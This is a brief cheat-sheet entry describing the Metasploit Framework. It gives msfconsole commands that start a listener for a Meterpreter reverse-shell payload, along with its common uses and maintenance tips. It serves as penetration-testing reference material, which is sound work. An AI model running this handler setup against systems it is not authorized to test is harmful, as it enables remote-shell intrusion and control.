# Metasploit Framework

**Description:**  
Metasploit is an exploitation framework for developing and executing exploit code against targets.

**Basic Syntax (msfconsole):**
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
exploit
```

**Common Uses:**  
- Launch payload handlers, run exploit modules, post-exploitation with Meterpreter.

**Tips:**  
- Keep Metasploit updated (`msfupdate`). Use `search`, `info`, `show options` commands in msfconsole.